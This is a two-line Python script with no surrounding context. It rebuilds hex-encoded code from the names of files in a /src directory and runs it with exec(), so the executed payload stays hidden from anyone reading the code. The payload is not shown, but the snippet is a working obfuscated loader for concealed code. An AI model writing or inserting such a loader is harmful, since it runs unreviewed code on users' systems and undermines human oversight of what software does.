import os
exec(bytes.fromhex("".join(i[4:]for i in sorted(os.listdir("/src"))[:-3])))